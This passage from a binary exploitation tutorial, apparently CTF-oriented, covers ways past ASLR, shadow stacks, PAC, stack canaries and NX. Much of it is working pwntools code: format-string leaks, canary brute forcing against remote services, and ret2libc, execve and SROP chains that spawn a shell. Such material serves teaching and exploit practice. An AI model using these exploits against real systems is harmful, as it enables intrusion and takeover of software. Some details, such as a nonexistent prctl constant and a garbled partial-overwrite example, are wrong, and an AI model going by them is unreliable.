**ASLR bypass technique 2: Stack reading**

Stack contains return addresses pointing to libc/binary:

```bash
gdb ./binary
(gdb) break main
(gdb) run
(gdb) x/100x $rsp
; Look for addresses pointing to known ranges
```

**Exploit stack leak:**

```python
# Format string reads stack
payload = "%x.%x.%x.%x.%x.%x.%x.%x.%x.%x"
p.send(payload)
leaks = p.recv(1024)

# Parse leaks to find libc addresses
for leak in parse_leaks(leaks):
    if 0x7f00000000 < leak < 0x800000000:
        libc_base = leak & ~0xfff
        break
```

**ASLR bypass technique 3: Return address prediction**

Partial ASLR (level 1) doesn't randomize lower bits:

```
Full ASLR: 0x7ffff7d4e000 (12-bit randomization)
Partial ASLR: 0x7ffff7d00000 (fixed lower bits)
```

Exploit known lower bits:

```python
# Partial ASLR: lower 12 bits fixed
libc_offset = 0xd00000  # Known offset
possible_bases = [0x7ffff7000000 + i * 0x1000 for i in range(256)]

# Try each possibility
for base in possible_bases:
    system_addr = base + 0x50000
    exploit_with(system_addr)
```

**ASLR bypass technique 4: Heap spray**

Allocate many objects at predictable heap addresses (requires partial ASLR):

```python
# Allocate objects
for i in range(1000):
    alloc(0x1000)

# Heap now at predictable location
shellcode_addr = heap_base + 0x50000
```

**ASLR bypass technique 5: PLT/GOT entries**

PLT addresses fixed within binary, which may be at partially-predictable location:

```bash
objdump -d /path/to/binary | grep "@plt"
```

Addresses like `0x401000` are binary-relative. With PIE enabled, binary base randomized, but offsets within binary are constant:

```python
# PIE binary: base randomized, offsets fixed
binary_base = leaked_addr - known_offset

system_plt = binary_base + 0x1050  # @plt offset from binary base
```

**ASLR bypass technique 6: Code reuse with relative addresses**

ROP gadgets use position-independent instruction sequences:

```asm
lea rdi, [rel bin_sh]     ; Position-independent
call system               ; Direct call (binary-relative)
```

These work without address leaks:

```python
# No leak needed for direct calls
rop = ROP(binary)
rop.call('system', [elf.search(b'/bin/sh').__next__()])
```

**ASLR bypass technique 7: Brute force (small randomization space)**

Partial ASLR (level 1) randomizes limited bits:

```
Partial ASLR: 12 bits = 4096 possibilities
```

Brute force all possibilities:

```python
for attempt in range(4096):
    libc_base = 0x7ffff7000000 + attempt * 0x1000
    system_addr = libc_base + system_offset
    
    try:
        p = process('./binary')
        exploit_with(system_addr)
        if success_check():
            print(f"Success with base: {hex(libc_base)}")
            break
    except:
        pass
```

**ASLR bypass technique 8: Null pointer dereference**

If vulnerability allows reading from null, leak kernel addresses:

```c
// Kernel space addresses start at 0xffffffff80000000
// If readable, reveals kernel layout
```

[Unverified] Kernel space generally not readable from userspace; requires privilege escalation.

**ASLR bypass technique 9: /proc/pid/maps reading**

If process has readable `/proc/self/maps`, directly read memory layout:

```python
# Read memory map
with open('/proc/self/maps', 'r') as f:
    for line in f:
        if 'libc' in line:
            libc_base = int(line.split('-')[0], 16)
            break
```

Exploitation:

```bash
# Process reads own memory map
./binary --read-maps
```

**ASLR bypass technique 10: One-gadget with constraints**

One-gadget provides constraint-free execution if conditions met:

```bash
one_gadget ./libc.so.6
0x4f365 execve("/bin/sh", rsp+0x30, environ)
  constraints:
    rax == NULL
    rbx == 0
```

Exploit:

```python
# Set up registers to meet constraints
rop = ROP(binary)
rop.raw(xor_rax_gadget)      # rax = 0
rop.raw(xor_rbx_gadget)      # rbx = 0
rop.raw(libc_base + 0x4f365) # one-gadget
```

**ASLR detection and verification**

Run multiple times, observe address changes:

```bash
for i in {1..5}; do
  ./binary &
  sleep 0.1
  ldd -r $(pgrep -f binary) | grep libc
done
```

Different addresses across runs confirm ASLR.

**GDB ASLR observation:**

```bash
gdb ./binary
(gdb) break main
(gdb) run
(gdb) x/i main
; Note address
(gdb) run
(gdb) x/i main
; Compare addresses (same - GDB disables ASLR by default)
```

Re-enable:

```bash
(gdb) set disable-randomization off
```

**Checksec ASLR detection:**

```bash
checksec --file=./binary
ASLR            : ENABLED   ; (if PIE present, ASLR in effect)
```

**Exploitation with ASLR**

**Complete exploit combining leaks:**

```python
from pwn import *

p = process('./binary')

# Step 1: Leak libc address via format string
payload = "%25$p"
p.sendline(payload)
leak = p.recvline()
libc_leak = int(leak, 16)

# Calculate libc base
libc_base = libc_leak - 0x24b97  # Offset of leaked function

# Step 2: Leak stack canary (if present)
payload = "%23$p"
p.sendline(payload)
canary = int(p.recvline(), 16)

# Step 3: Build exploit
system_addr = libc_base + libc_db.query('system')[0]
bin_sh = libc_base + libc_db.query('/bin/sh')[0]

offset = 40
exploit = b'A' * offset
exploit += p64(canary)
exploit += p64(0x0)
exploit += p64(system_addr)

# Send exploit
p.sendline(exploit)
p.interactive()
```

**Pwntools ASLR handling:**

```python
from pwn import *

# Automatic leak detection
p = process('./binary')
elf = ELF('./binary')

# Leak libc
leak = p.recv(8)
libc = ELF('./libc.so.6')
libc.address = int.from_bytes(leak, 'little') - libc.symbols['printf']

# Use leaked libc for gadgets
rop = ROP(libc)
```

**libc-database for leak resolution:**

```bash
# Get libc.so.6 from system
cp /lib/x86_64-linux-gnu/libc.so.6 ./libc.so.6

# Search for build ID
file ./libc.so.6
libc.so.6: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux)

# Online database
# One leaked pointer -> base address + function offsets
```

**Real-world ASLR examples**

**Chrome sandbox ASLR:**

Chrome enables ASLR for all processes, defeats via JIT spray and heap layout manipulation.

**iOS ASLR:**

iOS implements fine-grained ASLR, Page Zero (null page unmapped), XN (execute never) bits on pages. Requires sophisticated leaks.

**Windows ASLR (ALSR):**

Windows implements similar ASLR, defeats via information disclosure and ROP chains.

---

## Shadow Stack and Indirect Branch Tracking

Shadow Stack (on ARM64) and Indirect Branch Tracking (x86) maintain separate control flow records, detecting ROP gadget chains and arbitrary returns. Understanding these protections enables evaluation of CFI effectiveness.

**Shadow Stack principles**

Separate stack maintains expected return addresses:

```
Normal stack:        Shadow stack:
[data]               [expected_ra_1]
[ra_1] ← RSP        [expected_ra_2]
[data]               [expected_ra_3]
[ra_2]

At ret instruction:
- Pop return address from normal stack
- Compare with shadow stack entry
- If mismatch: CFI violation (SIGSEGV)
```

**Intel CET (Control-flow Enforcement Technology)**

x86-64 extension providing shadow stack:

```bash
checksec --file=./binary
ShadowCallStack : Enabled
```

Automatically maintained by CPU:

```asm
call target        ; CPU pushes return address to both stacks
ret                ; CPU pops from normal stack, compares with shadow
```

**Enabling CET at compile time:**

```bash
gcc -fcf-protection=full program.c -o program
```

Flags:

- `-fcf-protection=full`: Both shadow stack and IBT
- `-fcf-protection=branch`: IBT only
- `-fcf-protection=return`: Shadow stack only

**ARM64 Pointer Authentication Code (PAC)**

ARM implements similar protection via cryptographic signing:

```
Pointer = 48-bit address
Authentication Code (PAC) = 16-bit cryptographic signature

At function call:
- Pointer authenticated with key
- If tampered, authentication fails
- Execution continues to random address or crashes
```

Compile with PAC:

```bash
gcc -mbranch-protection=standard program.c -o program
```

**Shadow Stack bypass techniques**

**1. Direct calls (no shadow stack check)**

Shadow stack only validates returns, not direct calls:

```asm
call 0x401000      ; Direct call, no shadow stack entry created
```

Exploit:

```python
# Use direct calls in ROP chain
rop = ROP(binary)
rop.call('system', [...])  # Direct call
```

**2. Return value substitution**

If code reads return value without verification:

```c
int result = function();
if (result == 0x1337) {
    // Trusted code path
}
```

Exploit via return value overwrite (limited impact).

**3. Signal handler exploitation**

Signal handlers may bypass shadow stack:

```c
signal(SIGSEGV, handler);
// Trigger SIGSEGV
*(int *)0 = 0;
// handler() called, potentially outside shadow stack scope
```

[Unverified] Modern kernels maintain shadow stack across signals.

**4. Setjmp/longjmp bypass**

Longjmp restores execution state including shadow stack:

```c
jmp_buf buf;
setjmp(buf);        // Save shadow stack state

// Modify longjmp target
buf->rip = gadget;

longjmp(buf, 1);    // Restore shadow stack with gadget
```

Exploitation:

```python
# Corrupt setjmp buffer
setjmp_addr = 0x601000
write_at(setjmp_addr, gadget_addr)

# longjmp restores corrupted state
p.send(trigger_longjmp)
```

**5. Privilege escalation to disable CET**

If exploit gains root, disable CET:

```c
prctl(PR_SET_MDI_SHADOW_STACK, 0);  // Disable CET
```

Impractical in typical CTF scenario.

**6. Memory corruption in shadow stack**

Shadow stack itself stored in memory, potentially corruptible:

```
Shadow stack region: 0x7ffff7c00000-0x7ffff7c01000

Overflow into shadow stack to corrupt expected returns
```

[Unverified] Shadow stack region typically protected with separate permissions, preventing direct overflow.

**7. Return-into-libc (without ROP)**

Call libc functions directly:

```python
# Call system() without ROP gadgets
rop = ROP(binary)
rop.call('system', [bin_sh])
```

Shadow stack records return to 0x401234 (after call), exploit works if control continues legitimately.

**8. Vulnerability in shadow stack implementation**

Hardware/kernel shadow stack bugs:

```python
# Exploit CET implementation flaw
# (Extremely rare, requires 0-day)
```

[Unverified] CET implementations well-tested, exploitable vulnerabilities rare.

**PAC bypass techniques**

**1. Signed pointer reuse**

Existing signed pointers in memory:

```c
void *signed_ptr = create_signed_pointer(target);
// signed_ptr cryptographically signed
// Reuse for exploitation
```

Exploit:

```python
# Find signed pointer in binary
signed_ptr = leak_from_binary()
# Use directly, authentication passes
```

**2. Key prediction**

If PAC key predictable:

```python
# Standard keys used by OS
target = 0x401234
pac_key = 0x0  # Default key

# Compute PAC
authenticated_ptr = compute_pac(target, pac_key)

# Use authenticated pointer
exploit_with(authenticated_ptr)
```

[Unverified] PAC keys derived from hardware entropy, extremely difficult to predict.

**3. Gadget without authentication**

Gadgets without pointer dereference:

```asm
mov rax, rbx ; ret    ; No pointer dereference
```

Shadow stack/PAC doesn't protect register-to-register operations.

**4. Authenticated gadget chains**

Chain existing authenticated operations:

```python
# Find sequence of authenticated instructions
# that perform useful operations when chained
```

**5. PAC oracle exploitation**

If application provides PAC verification oracle:

```python
# Try pointers, observe which authenticate successfully
for offset in range(0x10000):
    ptr = base + offset
    if authenticate(ptr):
        print(f"Valid pointer at {hex(ptr)}")
```

Brute force pointer space (2^48 = impractical).

**6. Timing side-channel**

[Unverified] Timing variation in authentication:

```python
times = []
for ptr in candidate_pointers:
    start = time()
    authenticate(ptr)
    elapsed = time() - start
    times.append((ptr, elapsed))

# Analyze timing distribution
```

Modern constant-time implementations prevent this.

**Detection and verification**

**Checksec CET detection:**

```bash
checksec --file=./binary
ShadowCallStack : Enabled
Clang CFI       : Enabled
```

**Readelf CET flags:**

```bash
readelf -l /path/to/binary | grep -i "flags"
```

Look for `GNU_PROPERTY_X86_FEATURE_1_IBT` or `GNU_PROPERTY_X86_FEATURE_1_SHSTK`.

**GDB CET verification:**

```bash
gdb ./binary
(gdb) break main
(gdb) run
; Try ROP gadget
(gdb) call (void)gadget_addr
; If CET enabled, crashes or error
```

**Runtime CET detection:**

```c
#include <sys/prctl.h>
#include <linux/prctl.h>

int has_cet() {
    return prctl(PR_GET_SHADOW_STACK_STATUS) >= 0;
}
```

**ARM PAC detection:**

```bash
readelf -l /path/to/binary | grep -i "pac"
```

Or runtime:

```c
#include <arm_acle.h>

int has_pac() {
    return __arm_feature_pauth();
}
```

**Exploitation with CET/PAC**

**Conservative ROP without CET bypass:**

```python
# Only use direct calls, no ROP chains
rop = ROP(binary)
for gadget in generate_gadgets():
    if is_direct_call(gadget):
        rop.raw(gadget)
```

**Gadget filtering:**

```bash
ROPgadget --binary /path/to/binary --all | grep -v "ret$"
# Find gadgets ending with jmp (not ret)
```

---

**Related advanced protection subtopics essential for comprehensive mitigation understanding:** Hardware-Supported Memory Tagging Extension (MTE) on ARM64 detecting memory safety violations, Software-based hardening (ASAN/UBSAN) during development for vulnerability detection, and Exploit mitigation statistics showing real-world protection effectiveness across attack categories.

---

# Bypass Techniques

## Canary Leak and Bypass

### Stack Canary Overview

**Stack canary:** Security mechanism to detect stack buffer overflows

**Implementation:**

```c
// Compiler inserts canary value between local variables and return address
void vulnerable_function(char *input) {
    unsigned long canary = __stack_chk_guard;  // Read from TLS
    char buffer[64];
    
    strcpy(buffer, input);  // Vulnerable operation
    
    if (canary != __stack_chk_guard)
        __stack_chk_fail();  // Abort on mismatch
}
```

**Stack layout with canary:**

```
Higher addresses
┌──────────────────┐
│ Return address   │ ← Goal: Overwrite this
├──────────────────┤
│ Saved RBP        │
├──────────────────┤
│ Stack canary     │ ← Must preserve or leak this
├──────────────────┤
│ Local variables  │
│ buffer[64]       │ ← Overflow starts here
└──────────────────┘
Lower addresses
```

**Canary properties:**

- Random value generated at program start
- Stored in Thread Local Storage (TLS)
- Typically 8 bytes on x64, 4 bytes on x86
- Null byte terminator (LSB = 0x00) prevents string leaks

### Canary Detection

**Identifying canary presence:**

**Static analysis:**

```bash
# Check if compiled with stack protector
readelf -s binary | grep stack_chk

# Expected output:
# __stack_chk_fail@GLIBC
# __stack_chk_guard (in TLS)

# Objdump verification
objdump -d binary | grep stack_chk
# Look for calls to __stack_chk_fail
```

**Assembly patterns:**

```assembly
; Function prologue (canary setup)
mov    rax, qword ptr fs:[0x28]    ; Read canary from TLS
mov    qword ptr [rbp-0x8], rax    ; Store on stack

; Function epilogue (canary check)
mov    rax, qword ptr [rbp-0x8]    ; Read canary from stack
xor    rax, qword ptr fs:[0x28]    ; Compare with TLS value
je     return_safely
call   __stack_chk_fail             ; Abort if mismatch
```

**GCC stack protection levels:**

```bash
# Compile options:
-fno-stack-protector          # Disabled
-fstack-protector             # Functions with vulnerable buffers
-fstack-protector-strong      # More functions protected (default)
-fstack-protector-all         # All functions protected
```

### Canary Leak via Format String

**Vulnerability:** Format string allows reading stack values

**Technique:**

```c
// Vulnerable code
char buffer[100];
fgets(buffer, 100, stdin);
printf(buffer);  // Format string vulnerability
```

**Exploitation workflow:**

**Step 1: Find canary offset on stack**

```python
from pwn import *

p = process('./binary')

# Test different offsets
for i in range(1, 50):
    p.sendline(f'%{i}$p'.encode())
    response = p.recvline()
    print(f"Offset {i}: {response}")
```

**Example output:**

```
Offset 7: 0x7fffffffde20    ← Stack address
Offset 11: 0x4141414141414141 ← Our input
Offset 13: 0x1a2b3c4d5e6f7000 ← Canary (ends in 00)
Offset 15: 0x7fffffffdf50    ← Saved RBP
Offset 16: 0x401234          ← Return address
```

**Step 2: Extract canary value**

```python
# Leak canary at offset 13
p.sendline(b'%13$p')
canary_leak = p.recvline()
canary = int(canary_leak.strip(), 16)
log.info(f"Leaked canary: {hex(canary)}")
```

**Step 3: Use in overflow payload**

```python
# Buffer overflow with canary preservation
payload = b'A' * 64          # Fill buffer
payload += p64(canary)       # Preserve canary value
payload += b'B' * 8          # Saved RBP (can be junk)
payload += p64(win_addr)     # Overwrite return address

p.sendline(payload)
```

### Canary Leak via Partial Overwrite

**Scenario:** Off-by-one or partial read vulnerability

**Null byte terminator exploitation:**

```c
// Vulnerable: Reads without null termination
char buffer[64];
char canary_area[8];  // Contains canary
read(0, buffer, 65);  // Off-by-one: overwrites canary's null byte
printf("%s\n", buffer);  // Prints buffer + canary (no null terminator)
```

**Exploitation:**

```python
# Step 1: Overflow by one byte to remove null terminator
payload = b'A' * 64 + b'\xff'  # Overwrite canary's LSB
p.send(payload)

# Step 2: Read leaked data
leaked = p.recvline()
canary_bytes = leaked[64:72]  # Extract canary area
canary = u64(b'\x00' + canary_bytes[1:8])  # Reconstruct with null byte

log.info(f"Leaked canary: {hex(canary)}")
```

### Canary Leak via Arbitrary Read

**Technique:** Direct memory read to TLS or stack

**Reading from TLS (Thread Local Storage):**

```python
# Find TLS base
# fs:0x28 contains canary on x64
# gs:0x14 contains canary on x86

# If we have arbitrary read primitive
tls_offset = 0x28
canary = arbitrary_read(tls_base + tls_offset)
```

**Reading from stack:**

```python
# If we can leak stack addresses
rbp_leak = leak_stack_addr()

# Canary typically at RBP - 0x8
canary_addr = rbp_leak - 0x8
canary = arbitrary_read(canary_addr)
```

### Canary Bruteforce (Fork-based Services)

**Scenario:** Server forks on each connection, preserving canary value

**Technique:** Bruteforce canary byte-by-byte

```python
def bruteforce_canary():
    canary = b'\x00'  # LSB always 0x00
    
    for byte_pos in range(1, 8):  # 7 bytes to bruteforce
        for guess in range(256):
            p = remote('target', 1337)
            
            # Overflow to canary position + current byte
            payload = b'A' * 64  # Fill buffer
            payload += canary    # Known bytes
            payload += bytes([guess])  # Guess current byte
            
            p.send(payload)
            response = p.recv()
            
            if b'stack smashing detected' not in response:
                # Correct byte found (no crash)
                canary += bytes([guess])
                log.info(f"Found byte {byte_pos}: {hex(guess)}")
                break
            
            p.close()
    
    return canary

canary = bruteforce_canary()
log.success(f"Full canary: {canary.hex()}")
```

**Requirements:**

- Program must fork (not re-exec)
- Must distinguish crash from success
- Time-intensive: 256 * 7 = 1792 maximum attempts

### Canary Bypass via Overwrite

**Scenario:** Overwrite both stack and TLS canary

**Technique 1: Arbitrary write to TLS**

```python
# If we have arbitrary write primitive
tls_canary_addr = tls_base + 0x28

# Overwrite TLS canary with known value
arbitrary_write(tls_canary_addr, 0x4141414141414141)

# Now overflow with same value
payload = b'A' * 64
payload += p64(0x4141414141414141)  # Match TLS value
payload += p64(fake_rbp)
payload += p64(rop_chain)
```

**Technique 2: Thread creation with custom TLS**

```python
# If we can trigger thread creation with controlled TLS
# New thread inherits modified TLS
# Canary check uses our controlled value
```

### Stack Canary Bypass via Exception Handling

**Technique:** Trigger exception before canary check

**C++ exception exploitation:**

```cpp
// Vulnerable function
void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // Overflow
    
    if (some_condition)
        throw std::exception();  // Exception thrown before return
    
    // Canary check happens here (epilogue)
}
```

**Exploitation:**

```python
# Craft input that triggers exception path
# Exception unwinding bypasses canary check
# But still allows control flow hijacking via exception handlers
```

[Inference] Exception-based bypasses are highly context-dependent and may not reliably bypass canaries in all implementations.

### Canary-less Functions

**Identifying unprotected functions:**

```bash
# Functions without canary
objdump -d binary | grep -B20 "ret" | grep -v "stack_chk"

# Look for functions without canary setup/check
# Typically:
# - Small functions
# - Functions without buffers
# - Functions without pointer arithmetic
```

**Strategy:** Chain to unprotected function first

```python
# If main() has canary but helper() doesn't:
# 1. Overflow in main() with canary preservation
# 2. Return to helper()
# 3. Overflow in helper() without canary
# 4. ROP chain from helper()
```

---

## NX Bypass via ROP

### NX (No-eXecute) Protection

**NX bit:** Hardware protection marking memory non-executable

**Implementation:**

- Stack marked NX (non-executable)
- Heap marked NX (non-executable)
- Only code sections executable
- Prevents direct shellcode execution

**Detection:**

```bash
# Check NX status
readelf -l binary | grep GNU_STACK
# GNU_STACK ... RW  # NX enabled (no X flag)
# GNU_STACK ... RWE # NX disabled (has X flag)

# Using checksec
checksec --file=binary
# NX: NX enabled / NX disabled
```

### ROP (Return-Oriented Programming) Fundamentals

**Concept:** Chain existing code fragments (gadgets) to perform computation

**Gadget:** Short instruction sequence ending in `ret`

**Example gadgets:**

```assembly
; Gadget 1: pop rdi; ret
0x401234: pop rdi
0x401235: ret

; Gadget 2: pop rsi; pop r15; ret
0x401567: pop rsi
0x401568: pop r15
0x401569: ret

; Gadget 3: syscall; ret
0x4018ab: syscall
0x4018ad: ret
```

**ROP chain structure:**

```
Stack layout:
┌──────────────────┐
│ Gadget 1 address │ ← Return here first
├──────────────────┤
│ Argument for G1  │ ← Popped by gadget 1
├──────────────────┤
│ Gadget 2 address │ ← Gadget 1 rets here
├──────────────────┤
│ Argument for G2  │
├──────────────────┤
│ Gadget 3 address │
└──────────────────┘
```

### Finding ROP Gadgets

**Using ROPgadget:**

```bash
# Find all gadgets
ROPgadget --binary binary

# Find specific gadgets
ROPgadget --binary binary --only "pop|ret"
ROPgadget --binary binary --grep "pop rdi"

# Generate ROP chain (basic)
ROPgadget --binary binary --ropchain
```

**Using ropper:**

```bash
# Interactive mode
ropper --file binary

# Search for gadgets
ropper --file binary --search "pop rdi"

# Chain generation
ropper --file binary --chain "execve"
```

**Using pwntools:**

```python
from pwn import *

elf = ELF('./binary')
rop = ROP(elf)

# Find gadgets
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_r15 = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]

# Or automated chain building
rop.call('system', ['/bin/sh'])
```

**Manual gadget searching in GDB:**

```gdb
# Disassemble sections
disassemble system
disassemble main

# Search for byte patterns
find /b 0x400000, 0x500000, 0x5f, 0xc3  # pop rdi; ret (bytes)

# Using pwndbg
rop --grep "pop rdi"
```

### x64 System V ABI Calling Convention

**Register usage (critical for ROP):**

```
Function arguments:
1st: RDI
2nd: RSI
3rd: RDX
4th: RCX
5th: R8
6th: R9
Stack: Additional arguments

Return value: RAX
Preserved: RBX, RBP, R12-R15
Scratch: RAX, RCX, RDX, RSI, RDI, R8-R11
```

**Setting up function call via ROP:**

```assembly
; To call: system("/bin/sh")
; Need: RDI = address of "/bin/sh"

; Gadget chain:
pop rdi        ; Load RDI with next stack value
ret            ; Return to next gadget

; Stack layout:
address_of_pop_rdi
address_of_bin_sh_string
address_of_system
```

### Basic ROP Chain: ret2libc

**ret2libc:** Return to libc functions instead of shellcode

**Requirements:**

1. Libc address (ASLR bypass needed)
2. Address of target function (system, execve)
3. Address of argument string ("/bin/sh")
4. Gadgets to set up registers

**Complete exploitation:**

**Step 1: Find gadgets**

```python
from pwn import *

elf = ELF('./binary')
libc = ELF('./libc.so.6')

# Find gadgets
pop_rdi = 0x401234  # pop rdi; ret

# Find "/bin/sh" in libc
bin_sh = next(libc.search(b'/bin/sh\x00'))
```

**Step 2: Build ROP chain**

```python
# Overflow buffer
payload = b'A' * 72  # Padding to return address

# ROP chain: system("/bin/sh")
payload += p64(pop_rdi)                    # Gadget 1
payload += p64(libc.address + bin_sh)      # Argument for RDI
payload += p64(libc.symbols['system'])     # Call system()
```

**Step 3: Send exploit**

```python
p = process('./binary')
p.sendline(payload)
p.interactive()  # Shell!
```

### Advanced ROP: execve Syscall

**execve syscall parameters:**

```c
// execve("/bin/sh", NULL, NULL)
// RAX = 59 (syscall number)
// RDI = address of "/bin/sh"
// RSI = NULL
// RDX = NULL
```

**Building syscall ROP chain:**

```python
# Required gadgets
pop_rax = 0x401111  # pop rax; ret
pop_rdi = 0x401234  # pop rdi; ret
pop_rsi = 0x401567  # pop rsi; pop r15; ret
pop_rdx = 0x4018ab  # pop rdx; ret
syscall = 0x401999  # syscall; ret

# ROP chain
payload = b'A' * offset
payload += p64(pop_rax) + p64(59)              # RAX = 59 (execve)
payload += p64(pop_rdi) + p64(bin_sh_addr)     # RDI = "/bin/sh"
payload += p64(pop_rsi) + p64(0) + p64(0)      # RSI = NULL (r15 = junk)
payload += p64(pop_rdx) + p64(0)               # RDX = NULL
payload += p64(syscall)                        # Execute syscall
```

### ROP Chain Building with pwntools

**Automated chain generation:**

```python
from pwn import *

context.binary = elf = ELF('./binary')
libc = ELF('./libc.so.6')

rop = ROP(elf)

# Method 1: High-level API
rop.call('system', [next(libc.search(b'/bin/sh'))])

# Method 2: Manual gadgets
rop.raw(0x4141414141414141)  # Padding/junk
rop.pop_rdi = p64(bin_sh)
rop.call('system')

# Generate payload
payload = fit({
    offset: rop.chain()
})

# Or dump for inspection
print(rop.dump())
```

### Stack Alignment Issues

**Problem:** Some functions require 16-byte stack alignment (SSE instructions)

**Symptom:** Segfault in system() or libc functions despite correct ROP chain

**Solution:** Add extra `ret` gadget for alignment

```python
ret_gadget = 0x401016  # Just 'ret' instruction

# Before system() call, add ret for alignment
payload = b'A' * offset
payload += p64(pop_rdi) + p64(bin_sh)
payload += p64(ret_gadget)     # Stack alignment
payload += p64(system_addr)
```

**Testing alignment:**

```gdb
# Break at system
b *system

# Check RSP alignment
p $rsp & 0xf
# Should be 0x0 (aligned) or 0x8 (after call)
# If 0x8, add ret gadget before call
```

### SROP (Sigreturn-Oriented Programming)

**Concept:** Use sigreturn syscall to set all registers at once

**sigreturn mechanism:**

- Kernel restores register state from signal frame on stack
- Signal frame contains all register values
- No validation of frame contents

**Exploitation:**

```python
from pwn import *

context.arch = 'amd64'

# Create fake signal frame
frame = SigreturnFrame()
frame.rax = 59                    # execve syscall
frame.rdi = bin_sh_addr           # First argument
frame.rsi = 0                     # Second argument
frame.rdx = 0                     # Third argument
frame.rip = syscall_gadget        # RIP after sigreturn
frame.rsp = controlled_stack      # Stack pointer

# ROP chain
payload = b'A' * offset
payload += p64(pop_rax) + p64(15)  # RAX = 15 (sigreturn syscall)
payload += p64(syscall_gadget)     # Execute sigreturn
payload += bytes(frame)            # Fake signal frame
```

**Advantages:**

- Single gadget sets all registers
- Useful when few gadgets available
- Bypasses complex register setups

### JOP/COP (Jump/Call-Oriented Programming)

**Concept:** Use indirect jumps/calls instead of returns

**JOP gadgets:**

```assembly
; Dispatcher gadget
pop rax
jmp rax

; Worker gadgets
some_instructions
jmp [rbx+0x10]  # Indirect jump
```

[Inference] JOP/COP techniques are more complex than ROP and primarily useful when return-based gadgets are insufficient or filtered.

---

## ASLR Bypass (Information Leaks)

### ASLR (Address Space Layout Randomization) Overview

**ASLR:** Randomizes memory layout at program start

**Randomized regions:**

- Stack addresses
- Heap addresses
- Library (libc) mappings
- Executable base (if PIE enabled)

**ASLR levels (Linux):**

```bash
# Check ASLR status
cat /proc/sys/kernel/randomize_va_space
# 0 = Disabled
# 1 = Randomize stack, heap, libraries (not exec if no PIE)
# 2 = Full randomization (recommended)

# Disable ASLR (testing only)
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

**Detection:**

```bash
# Run multiple times, check addresses
for i in {1..5}; do
    gdb -batch -ex "b main" -ex "run" -ex "print \$rip" ./binary
done

# If addresses change → ASLR active
# If addresses same → ASLR disabled or not PIE
```

### Information Leak Primitives

**Common leak vulnerabilities:**

1. Format string vulnerabilities
2. Uninitialized memory disclosure
3. Buffer over-read
4. Use-after-free data remnants
5. Debug/error messages with addresses

### Format String Leaks

**Technique:** Read stack/memory values via format specifiers

**Leaking stack addresses:**

```python
# Leak stack values at different offsets
for i in range(1, 20):
    p.sendline(f'%{i}$p'.encode())
    leak = p.recvline()
    print(f"Offset {i}: {leak}")

# Identify leak types:
# 0x7fffffffXXXX → Stack address
# 0x7ffff7XXXXXX → Libc address
# 0x555555XXXXXX → PIE binary address (if PIE)
# 0x4XXXXX → Fixed binary address (if no PIE)
```

**Leaking libc address:**

```python
# Find libc pointer on stack (saved return address, GOT entry, etc.)
p.sendline(b'%15$p')  # Assume offset 15 has libc pointer
libc_leak = int(p.recvline().strip(), 16)

# Calculate libc base
# Need to know what function the leaked address belongs to
libc_base = libc_leak - libc.symbols['__libc_start_main'] - offset
log.info(f"Libc base: {hex(libc_base)}")
```

**Arbitrary read via format string:**

```python
# Read value at specific address
target_addr = 0x404000

# Method 1: Using %s (dangerous, may crash)
payload = p64(target_addr) + b'%7$s'  # If pointer at offset 7

# Method 2: Using positional read
# Place address on stack, read it
payload = p64(target_addr)
payload += b'%7$p'  # Read from offset containing our address
```

### GOT/PLT Leaks

**GOT (Global Offset Table):** Contains resolved library addresses

**Exploitation:**

```python
# Step 1: Leak GOT entry
elf = ELF('./binary')
puts_got = elf.got['puts']

# Use arbitrary read or format string
leaked_puts = leak_memory(puts_got)  # Read GOT entry
log.info(f"Leaked puts@GOT: {hex(leaked_puts)}")

# Step 2: Calculate libc base
libc = ELF('./libc.so.6')
libc.address = leaked_puts - libc.symbols['puts']
log.success(f"Libc base: {hex(libc.address)}")

# Step 3: Calculate other functions
system_addr = libc.symbols['system']
bin_sh_addr = next(libc.search(b'/bin/sh'))
```

**ret2plt for leak:**

```python
# Call puts(puts@GOT) to leak its address
payload = b'A' * offset
payload += p64(pop_rdi) + p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_addr)  # Return to main for second exploit

p.sendline(payload)
leaked_puts = u64(p.recv(6).ljust(8, b'\x00'))

# Now have libc base, send second payload with system()
```

### Buffer Over-read Leaks

**Vulnerability:** Reading beyond buffer boundaries

**Exploitation:**

```c
// Vulnerable code
char buffer[64];
char secret[8] = "flaghere";

read(0, buffer, 64);
write(1, buffer, 100);  // Over-read: leaks secret
```

```python
# Trigger over-read
p.send(b'A' * 64)  # Fill buffer exactly
leaked = p.recv(100)
secret = leaked[64:72]
log.info(f"Leaked secret: {secret}")
```

### Partial Overwrite Techniques

**Scenario:** ASLR but only 12 bits randomized (pages)

**Technique:** Overwrite least significant bytes

```python
# Libc address: 0x7ffff7a0d000 (randomized)
# Last 12 bits (3 hex digits) are fixed per page
# Can bruteforce or use partial overwrite

# Example: Overwrite return address LSB to nearby function
payload = b'A' * offset
payload += b'\x34\x12'  # Partial overwrite (2 bytes)
# If original: 0x00007ffff7a0d567
# After write: 0x00007ffff7a1234
# Might hit different function/gadget in libc

```

**Bruteforce partial ASLR:**

```python
# Try multiple times until correct alignment
for attempt in range(4096):  # Max pages
    p = remote('target', 1337)
    p.send(payload_with_partial_overwrite)
    try:
        p.interactive()
        break  # Success
    except:
        p.close()
```

### Environment Variable Leaks

**Technique:** Leak addresses from environment

**/proc/self/maps parsing:**

```c
// If program has file read capability
FILE *fp = fopen("/proc/self/maps", "r");
// Read file to leak memory layout
```

**Auxiliary vector leaks:**

```c
// AT_SYSINFO_EHDR → vDSO address
// AT_BASE → Interpreter base
// Can leak via /proc/self/auxv
```

### Heap Address Leaks

**Use-after-free leak:**

```python
# Step 1: Allocate and free chunk
a = malloc(0x100)
free(a)

# Step 2: Chunk now contains fd/bk pointers (heap metadata)
# Read freed chunk to leak heap address
leak = read_memory(a, 8)
heap_leak = u64(leak)

# Heap addresses often reveal heap base
heap_base = heap_leak & ~0xfff  # Align to page
```

**Unsorted bin leak (libc):**

```python
# Free large chunk → enters unsorted bin
large = malloc(0x500)
free(large)

# Freed chunk's fd/bk now point to main_arena
leak = read_memory(large, 8)
arena_leak = u64(leak)

# Calculate libc base from arena offset
libc_base = arena_leak - libc_arena_offset
```

### Stack Address Leaks

**Leaking via saved RBP:**

```python
# RBP typically points to previous stack frame
# If we can leak RBP, we know stack layout

